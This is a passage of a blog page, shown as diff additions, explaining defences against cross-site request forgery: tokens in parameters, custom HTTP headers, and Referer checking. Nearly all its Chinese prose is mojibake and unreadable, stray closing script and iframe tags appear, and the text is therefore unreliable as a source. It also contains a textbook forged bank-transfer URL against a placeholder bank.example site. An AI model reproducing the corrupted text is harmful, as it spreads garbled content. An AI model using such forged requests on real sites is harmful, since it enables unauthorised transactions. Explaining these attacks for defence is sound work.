+<p><img src="/assets/image-20250520025334-kgrwlzn.png" alt="image"></p>
+<p>杩欑鏂规硶瑕佹瘮妫€鏌� Referer瑕佸畨鍏ㄤ竴浜涳紝token 鍙互鍦ㄧ敤鎴风櫥闄嗗悗浜х敓骞舵斁浜� session 涔嬩腑锛岀劧鍚庡湪姣忔璇锋眰鏃舵妸 token 浠� session 涓嬁鍑猴紝涓庤姹備腑鐨� token 杩涜姣斿锛屼絾杩欑鏂规硶鐨勯毦鐐瑰湪浜庡浣曟妸 token 浠ュ弬鏁扮殑褰㈠紡鍔犲叆璇锋眰銆�</p>
+<p>瀵逛簬 GET 璇锋眰锛宼oken 灏嗛檮鍦ㄨ姹傚湴鍧€涔嬪悗锛岃繖鏍� URL 灏卞彉鎴� <a target="_blank" rel="noopener" href="http://url/?csrftoken=tokenvalue%E9%8A%86%EF%BF%BD">http://url?csrftoken=tokenvalue銆�</a> 鑰屽浜� POST 璇锋眰鏉ヨ锛岃鍦� form 鐨勬渶鍚庡姞涓� 锛岃繖鏍峰氨鎶� token 浠ュ弬鏁扮殑褰㈠紡鍔犲叆璇锋眰浜嗐€�</p>
+<p><span data-type="text" style="color: var(--b3-font-color9);">浣嗘槸锛屽湪涓€涓綉绔欎腑锛屽彲浠ユ帴鍙楄姹傜殑鍦版柟闈炲父澶氾紝瑕佸浜庢瘡涓€涓姹傞兘鍔犱笂 token 鏄緢楹荤儲鐨勶紝骞朵笖寰堝鏄撴紡鎺夛紝閫氬父浣跨敤鐨勬柟娉曞氨鏄湪姣忔椤甸潰鍔犺浇鏃讹紝浣跨敤 javascript 閬嶅巻鏁翠釜 dom 鏍戯紝瀵逛簬 dom 涓墍鏈夌殑 a 鍜� form 鏍囩鍚庡姞鍏� token銆�</span></p>
+<p>杩欐牱鍙互瑙ｅ喅澶ч儴鍒嗙殑璇锋眰锛屼絾鏄浜庡湪椤甸潰鍔犺浇涔嬪悗鍔ㄦ€佺敓鎴愮殑 html 浠ｇ爜锛岃繖绉嶆柟娉曞氨娌℃湁浣滅敤锛岃繕闇€瑕佺▼搴忓憳鍦ㄧ紪鐮佹椂鎵嬪姩娣诲姞 token銆�</p>
+<p>璇ユ柟娉曡繕鏈変竴涓己鐐规槸闅句互淇濊瘉 token 鏈韩鐨勫畨鍏ㄣ€傜壒鍒槸鍦ㄤ竴浜涜鍧涗箣绫绘敮鎸佺敤鎴疯嚜宸卞彂琛ㄥ唴瀹圭殑缃戠珯锛岄粦瀹㈠彲浠ュ湪涓婇潰鍙戝竷鑷繁涓汉缃戠珯鐨勫湴鍧€銆傜敱浜庣郴缁熶篃浼氬湪杩欎釜鍦板潃鍚庨潰鍔犱笂 token锛岄粦瀹㈠彲浠ュ湪鑷繁鐨勭綉绔欎笂寰楀埌杩欎釜 token锛屽苟椹笂灏卞彲浠ュ彂鍔� CSRF 鏀诲嚮銆�</p>
+<p><span data-type="text" style="color: var(--b3-font-color6);">涓轰簡閬垮厤杩欎竴鐐癸紝绯荤粺鍙互鍦ㄦ坊鍔� token 鐨勬椂鍊欏鍔犱竴涓垽鏂紝濡傛灉杩欎釜閾炬帴鏄摼鍒拌嚜宸辨湰绔欑殑锛屽氨鍦ㄥ悗闈㈡坊鍔� token锛屽鏋滄槸閫氬悜澶栫綉鍒欎笉鍔�</span></p>
+<p>涓嶈繃锛屽嵆浣胯繖涓� csrftoken 涓嶄互鍙傛暟鐨勫舰寮忛檮鍔犲湪璇锋眰涔嬩腑锛岄粦瀹㈢殑缃戠珯涔熷悓鏍峰彲浠ラ€氳繃 Referer 鏉ュ緱鍒拌繖涓� token 鍊间互鍙戝姩 CSRF 鏀诲嚮銆傝繖涔熸槸涓€浜涚敤鎴峰枩娆㈡墜鍔ㄥ叧闂祻瑙堝櫒 Referer 鍔熻兘鐨勫師鍥犮€�</p>
+<h3 id="3銆佸湪-HTTP-澶翠腑鑷畾涔夊睘鎬у苟楠岃瘉"><a href="#3銆佸湪-HTTP-澶翠腑鑷畾涔夊睘鎬у苟楠岃瘉" class="headerlink" title="3銆佸湪 HTTP 澶翠腑鑷畾涔夊睘鎬у苟楠岃瘉"></a>3銆佸湪 HTTP 澶翠腑鑷畾涔夊睘鎬у苟楠岃瘉</h3><p>杩欑鏂规硶涔熸槸浣跨敤 token 骞惰繘琛岄獙璇侊紝鍜屼笂涓€绉嶆柟娉曚笉鍚岀殑鏄紝杩欓噷骞朵笉鏄妸 token 浠ュ弬鏁扮殑褰㈠紡缃簬 HTTP 璇锋眰涔嬩腑锛岃€屾槸鎶婂畠鏀惧埌 HTTP 澶翠腑鑷畾涔夌殑灞炴€ч噷銆傞€氳繃 XMLHttpRequest 杩欎釜绫伙紝鍙互涓€娆℃€х粰鎵€鏈夎绫昏姹傚姞涓� csrftoken 杩欎釜 HTTP 澶村睘鎬э紝骞舵妸 token 鍊兼斁鍏ュ叾涓€�</p>
+<p>杩欐牱瑙ｅ喅浜嗕笂绉嶆柟娉曞湪璇锋眰涓姞鍏� token 鐨勪笉渚匡紝鍚屾椂锛岄€氳繃XMLHttpRequest 璇锋眰鐨勫湴鍧€涓嶄細琚褰曞埌娴忚鍣ㄧ殑鍦板潃鏍忥紝涔熶笉鐢ㄦ媴蹇� token 浼氶€忚繃 Referer 娉勯湶鍒板叾浠栫綉绔欎腑鍘汇€�</p>
+<blockquote>
+<p><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">鐒惰€岃繖绉嶆柟娉曠殑灞€闄愭€ч潪甯稿ぇ锛孹MLHttpRequest 璇锋眰閫氬父鐢ㄤ簬 Ajax 鏂规硶涓浜庨〉闈㈠眬閮ㄧ殑寮傛鍒锋柊锛屽苟闈炴墍鏈夌殑璇锋眰閮介€傚悎鐢ㄨ繖涓被鏉ュ彂璧凤紝鑰屼笖閫氳繃璇ョ被璇锋眰寰楀埌鐨勯〉闈笉鑳借娴忚鍣ㄦ墍璁板綍涓嬶紝浠庤€岃繘琛屽墠杩涳紝鍚庨€€锛屽埛鏂帮紝鏀惰棌绛夋搷浣滐紝缁欑敤鎴峰甫鏉ヤ笉渚裤€�</span></p>
+</blockquote>
+<p>鍙﹀锛屽浜庢病鏈夎繘琛� CSRF 闃叉姢鐨勯仐鐣欑郴缁熸潵璇达紝瑕侀噰鐢ㄨ繖绉嶆柟娉曟潵杩涜闃叉姢锛岃鎶婃墍鏈夎姹傞兘鏀逛负 XMLHttpRequest 璇锋眰锛岃繖鏍峰嚑涔庢槸瑕侀噸鍐欐暣涓綉绔欙紝杩欎唬浠锋棤鐤戞槸涓嶈兘鎺ュ彈鐨勩€�</p>
+<h3 id="4銆侀獙璇�-HTTP-Referer-瀛楁"><a href="#4銆侀獙璇�-HTTP-Referer-瀛楁" class="headerlink" title="4銆侀獙璇� HTTP Referer 瀛楁"></a>4銆侀獙璇� HTTP Referer 瀛楁</h3><p>鏍规嵁 HTTP 鍗忚锛屽湪 HTTP 澶翠腑鏈変竴涓瓧娈靛彨Referer锛屽畠璁板綍浜嗚 HTTP 璇锋眰鐨勬潵婧愬湴鍧€銆傚湪閫氬父鎯呭喌涓嬶紝璁块棶涓€涓畨鍏ㄥ彈闄愰〉闈㈢殑璇锋眰鏉ヨ嚜浜庡悓涓€涓綉绔欙紝姣斿闇€瑕佽闂� 锛�</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;<span class="keyword">for</span>=Mallory</span><br></pre></td></tr></table></figure>
+
+<p>鐢ㄦ埛蹇呴』鍏堢櫥闄� bank.example锛岀劧鍚庨€氳繃鐐瑰嚮椤甸潰涓婄殑鎸夐挳鏉ヨЕ鍙戣浆璐︿簨浠躲€�</p>
+<p>杩欐椂锛岃杞笎璇锋眰鐨� Referer 鍊煎氨浼氭槸杞处鎸夐挳鎵€鍦ㄧ殑椤甸潰鐨� URL锛岄€氬父鏄互 bank.example 鍩熷悕寮€澶寸殑鍦板潃銆傝€屽鏋滈粦瀹㈣瀵归摱琛岀綉绔欏疄鏂� CSRF 鏀诲嚮锛屼粬鍙兘鍦ㄤ粬鑷繁鐨勭綉绔欐瀯閫犺姹傦紝褰撶敤鎴烽€氳繃榛戝鐨勭綉绔欏彂閫佽姹傚埌閾惰鏃讹紝璇ヨ姹傜殑 Referer 鏄寚鍚戦粦瀹㈣嚜宸辩殑缃戠珯銆�</p>
+<p><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">鍥犳锛岃闃插尽 CSRF 鏀诲嚮锛岄摱琛岀綉绔欏彧闇€瑕佸浜庢瘡涓€涓浆璐﹁姹傞獙璇佸叾 Referer 鍊硷紝濡傛灉鏄互 bank.example 寮€澶寸殑鍩熷悕锛屽垯璇存槑璇ヨ姹傛槸鏉ヨ嚜閾惰缃戠珯鑷繁鐨勮姹傦紝鏄悎娉曠殑銆傚鏋� Referer 鏄叾浠栫綉绔欑殑璇濓紝鍒欐湁鍙兘鏄粦瀹㈢殑 CSRF 鏀诲嚮锛屾嫆缁濊璇锋眰銆�</span></p>
+<p>鈥�</p>
+<p>杩欑鏂规硶鐨勬樉鑰屾槗瑙佺殑濂藉灏辨槸绠€鍗曟槗琛岋紝缃戠珯鐨勬櫘閫氬紑鍙戜汉鍛樹笉闇€瑕佹搷蹇� CSRF 鐨勬紡娲烇紝鍙渶瑕佸湪鏈€鍚庣粰鎵€鏈夊畨鍏ㄦ晱鎰熺殑璇锋眰缁熶竴澧炲姞涓€涓嫤鎴櫒鏉ユ鏌� Referer 鐨勫€煎氨鍙互銆傜壒鍒槸瀵逛簬褰撳墠鐜版湁鐨勭郴缁燂紝涓嶉渶瑕佹敼鍙樺綋鍓嶇郴缁熺殑浠讳綍宸叉湁浠ｇ爜鍜岄€昏緫锛屾病鏈夐闄╋紝闈炲父渚挎嵎銆�</p>
+<p><span data-type="text" style="background-color: var(--b3-card-info-background); color: var(--b3-card-info-color);">鐒惰€岋紝杩欑鏂规硶骞堕潪涓囨棤涓€澶便€俁eferer 鐨勫€兼槸鐢辨祻瑙堝櫒鎻愪緵鐨勶紝铏界劧 HTTP 鍗忚涓婃湁鏄庣‘鐨勮姹傦紝浣嗘槸姣忎釜娴忚鍣ㄥ浜� Referer 鐨勫叿浣撳疄鐜板彲鑳芥湁宸埆锛屽苟涓嶈兘淇濊瘉娴忚鍣ㄨ嚜韬病鏈夊畨鍏ㄦ紡娲炪€�</span></p>
+<p>浣跨敤楠岃瘉 Referer 鍊肩殑鏂规硶锛屽氨鏄妸瀹夊叏鎬ч兘渚濊禆浜庣涓夋柟锛堝嵆娴忚鍣級鏉ヤ繚闅滐紝浠庣悊璁轰笂鏉ヨ锛岃繖鏍峰苟涓嶅畨鍏ㄣ€�</p>
+<p>浜嬪疄涓婏紝瀵逛簬鏌愪簺娴忚鍣紝姣斿 IE6 鎴� FF2锛岀洰鍓嶅凡缁忔湁涓€浜涙柟娉曞彲浠ョ鏀� Referer 鍊笺€傚鏋� bank.example 缃戠珯鏀寔 IE6 娴忚鍣紝榛戝瀹屽叏鍙互鎶婄敤鎴锋祻瑙堝櫒鐨� Referer 鍊艰涓轰互 bank.example 鍩熷悕寮€澶寸殑鍦板潃锛岃繖鏍峰氨鍙互閫氳繃楠岃瘉锛屼粠鑰岃繘琛� CSRF 鏀诲嚮銆�</p>
+<p><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">鍗充究鏄娇鐢ㄦ渶鏂扮殑娴忚鍣紝榛戝鏃犳硶绡℃敼 Referer 鍊硷紝杩欑鏂规硶浠嶇劧鏈夐棶棰樸€傚洜涓� Referer 鍊间細璁板綍涓嬬敤鎴风殑璁块棶鏉ユ簮锛屾湁浜涚敤鎴疯涓鸿繖鏍蜂細渚电姱鍒颁粬浠嚜宸辩殑闅愮鏉冿紝鐗瑰埆鏄湁浜涚粍缁囨媴蹇� Referer 鍊间細鎶婄粍缁囧唴缃戜腑鐨勬煇浜涗俊鎭硠闇插埌澶栫綉涓€�</span></p>
+<p>鍥犳锛岀敤鎴疯嚜宸卞彲浠ヨ缃祻瑙堝櫒浣垮叾鍦ㄥ彂閫佽姹傛椂涓嶅啀鎻愪緵 Referer銆傚綋浠栦滑姝ｅ父璁块棶閾惰缃戠珯鏃讹紝缃戠珯浼氬洜涓鸿姹傛病鏈� Referer 鍊艰€岃涓烘槸 CSRF 鏀诲嚮锛屾嫆缁濆悎娉曠敤鎴风殑璁块棶銆�</p>
+<p>鎬荤粨<br>CSRF鏀诲嚮鏄敾鍑昏€呭埄鐢ㄧ敤鎴风殑韬唤鎿嶄綔鐢ㄦ埛璐︽埛鐨勪竴绉嶆敾鍑绘柟寮忋€傝璁SRF鐨勯槻寰℃柟妗堝繀椤诲厛鐞嗚ВCSRF鏀诲嚮鐨勫師鐞嗗拰鏈川銆傛垜浠€氬父浣跨敤Anti CSRF Token鏉ラ槻寰SRF鏀诲嚮锛屽湪浣跨敤Token鏃讹紝瑕佹敞鎰廡oken鐨勪繚瀵嗘€у拰闅忔満鎬с€�</p>
+</script></iframe></image></p>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/05/20/Web/CSRF/" data-id="cmawb0xv1000h747k7dy8hs39" data-title="CSRF" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CSRF/" rel="tag">CSRF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2024/05/20/Web/XSS/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          XSS跨站脚本攻击
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2024/05/20/Web/PHP%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/%E5%BC%BA%E6%AF%94%E8%BE%83/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">PHP强比较漏洞</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Web/">Web</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web/HTTP%E6%95%99%E7%A8%8B/">HTTP教程</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/PHP%E5%AE%89%E5%85%A8/">PHP安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/XSS/">XSS</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">注入漏洞</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E5%AE%89%E5%85%A8/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a></li></ul></li></ul></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF/" rel="tag">CSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF%E9%A2%98%E7%9B%AE/" rel="tag">CTF题目</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Content-Type/" rel="tag">Content-Type</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTP/" rel="tag">HTTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTTPS/" rel="tag">HTTPS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSStrike/" rel="tag">XSStrike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/labs/" rel="tag">labs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%9E%E6%88%98/" rel="tag">实战</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" rel="tag">对象注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="tag">报错注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" rel="tag">比较漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" rel="tag">网络协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" rel="tag">跨站脚本</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CSRF/" style="font-size: 10px;">CSRF</a> <a href="/tags/CTF%E9%A2%98%E7%9B%AE/" style="font-size: 10px;">CTF题目</a> <a href="/tags/Content-Type/" style="font-size: 10px;">Content-Type</a> <a href="/tags/HTTP/" style="font-size: 13.33px;">HTTP</a> <a href="/tags/HTTPS/" style="font-size: 10px;">HTTPS</a> <a href="/tags/PHP/" style="font-size: 16.67px;">PHP</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 13.33px;">SQL注入</a> <a href="/tags/XSS/" style="font-size: 20px;">XSS</a> <a href="/tags/XSStrike/" style="font-size: 10px;">XSStrike</a> <a href="/tags/labs/" style="font-size: 10px;">labs</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 13.33px;">反序列化</a> <a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 13.33px;">安全</a> <a href="/tags/%E5%AE%9E%E6%88%98/" style="font-size: 10px;">实战</a> <a href="/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">对象注入</a> <a href="/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">报错注入</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 10px;">数据库</a> <a href="/tags/%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">比较漏洞</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 10px;">渗透测试</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/" style="font-size: 10px;">网络协议</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 10px;">网络安全</a> <a href="/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/" style="font-size: 10px;">跨站脚本</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/05/">May 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">May 2024</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/xsstrike/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/sqlmap/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E7%BB%95%E8%BF%87/%E7%BB%95%E8%BF%87/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%9F%BA%E7%A1%80%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2025/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
